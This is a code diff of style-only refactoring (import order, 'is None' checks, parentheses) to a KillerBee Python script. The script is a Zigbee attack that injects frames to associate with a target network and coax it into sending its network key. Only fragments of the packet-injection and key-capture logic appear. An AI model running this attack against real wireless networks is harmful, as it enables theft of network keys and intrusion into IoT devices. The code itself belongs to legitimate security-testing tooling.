@@ -2,12 +2,11 @@
 # Contributed by: mandar.satam@gmail.com
 # Edited by:      ryan@riverloopsecurity.com
 # Version:        BETA
-from __future__ import print_function
 
-import sys
-import signal
 import binascii
+import signal
 import struct
+import sys
 import time
 
 from killerbee import *
@@ -58,10 +57,8 @@ def associate_response_handle(packet):
         if packet[21:22] == b"\x02":
             if packet[24:25] != b"\x00":
                 print(
-                    (
-                        "Association response status was not successful. Received {0}.".format(
-                            struct.unpack("B", packet[24:25])[0]
-                        )
+                    "Association response status was not successful. Received {0}.".format(
+                        struct.unpack("B", packet[24:25])[0]
                     )
                 )
                 return None
@@ -150,15 +147,15 @@ while len(sys.argv) > 1:
     if op == "-y":
         arg_IEEEdev = sys.argv.pop(1)
 
-if arg_channel == None:
+if arg_channel is None:
     print("ERROR: Must specify a channel with -f", file=sys.stderr)
     usage()
     sys.exit(1)
-if arg_panID == None:
+if arg_panID is None:
     print("ERROR: Must specify a PAN ID", file=sys.stderr)
     usage()
     sys.exit(1)
-if arg_IEE64addr == None or len(arg_IEE64addr) != 8:
+if arg_IEE64addr is None or len(arg_IEE64addr) != 8:
     print("ERROR: Must specify a 64-bit address of the target", file=sys.stderr)
     usage()
     sys.exit(1)
@@ -203,19 +200,19 @@ while start + arg_delay > time.time():
     # Does not block
     recvpkt = kb.pnext()
     # Check for empty packet (timeout) and valid FCS
-    if recvpkt != None and recvpkt["validcrc"]:
+    if recvpkt is not None and recvpkt["validcrc"]:
         print("Received frame")
         # If packet is an assocation response, get the assigned device
         # short address, else get None if packet isn't the right type
         value = associate_response_handle(recvpkt["bytes"])
-        if value != None:
+        if value is not None:
             # Let's ack them to thank them for the join...
             kb.sniffer_off()
             kb.inject(b"\x02\x00" + getAckByte(recvpkt["bytes"]))
             print("Short address: {0}".format(value))
             break
 
-if value == None:
+if value is None:
     print(
         "Sorry, we didn't hear a device respond with an association response. Do you have an active target within range?"
     )
@@ -224,7 +221,7 @@ if value == None:
     sys.exit(1)
 
 # Now build a packet to issue the SECOND DATA REQUEST, for the key to be sent
-if value != None:
+if value is not None:
     data_key_packet = (
         b"\x63\x88" + DATA_KEY_SEQNUM + arg_panID + ASSOC_DST + value + b"\x04"
     )  # data packet after association response
@@ -238,14 +235,14 @@ if value != None:
         # Does not block
         recvpkt = kb.pnext()
         # Check for empty packet (timeout) and valid FCS
-        if recvpkt != None and recvpkt["validcrc"]:
+        if recvpkt is not None and recvpkt["validcrc"]:
             receivedKey = transport_response_handle(recvpkt["bytes"])
-            if receivedKey != None:
+            if receivedKey is not None:
                 print("Received key: {0}".format(receivedKey.encode("hex")))
                 kb.close()
                 sys.exit(0)
 
-    if receivedKey == None:
+    if receivedKey is None:
         print(
             "Sorry, we didn't get a key. The effectiveness of this attack depends highly on the configuration of the target network."
         )
